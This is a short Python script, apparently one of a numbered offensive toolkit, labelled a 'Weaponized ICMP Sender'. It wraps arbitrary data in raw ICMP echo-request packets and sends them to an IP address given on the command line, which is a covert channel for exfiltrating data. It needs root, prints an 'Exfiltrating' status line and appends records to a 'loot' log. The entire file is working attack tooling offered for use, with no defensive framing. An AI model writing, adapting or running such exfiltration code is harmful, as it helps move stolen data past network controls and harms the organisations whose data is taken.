import os
import sys
import socket
import struct
import select
import time

def checksum(source_string):
    """
    Standard Internet Checksum calculation for ICMP headers.
    """
    countTo = (len(source_string) // 2) * 2
    sum = 0
    count = 0
    while count < countTo:
        thisVal = source_string[count + 1] * 256 + source_string[count]
        sum = sum + thisVal
        sum = sum & 0xffffffff
        count = count + 2
    if countTo < len(source_string):
        sum = sum + source_string[len(source_string) - 1]
        sum = sum & 0xffffffff
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def send_icmp_data(dest_ip, data):
    """
    Weaponized ICMP Sender: Wraps raw data into the payload 
    of a raw ICMP socket.
    """
    try:
        # Requires Raw Socket permissions (Root)
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("[-] ROOT REQUIRED: Raw sockets for ICMP require UID 0.")
        return

    # ICMP Type 8 (Echo Request), Code 0
    header = struct.pack("bbHHh", 8, 0, 0, 1, 1)
    
    # Calculate checksum with dummy 0
    my_checksum = checksum(header + data.encode())
    
    # Reconstruct header with correct checksum
    header = struct.pack("bbHHh", 8, 0, socket.htons(my_checksum), 1, 1)
    packet = header + data.encode()

    print(f"[*] Exfiltrating {len(data)} bytes to {dest_ip} via ICMP...")
    sock.sendto(packet, (dest_ip, 1))
    
    # Log to project loot
    loot_path = "../../../loot/forensic_history.log"
    with open(loot_path, "a") as log:
        log.write(f"Type: ICMP_EXFIL | Dest: {dest_ip} | Size: {len(data)}\n")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: sudo python3 169_icmp_exfil <dest_ip> '<data_string>'")
        sys.exit(1)
    
    send_icmp_data(sys.argv[1], sys.argv[2])
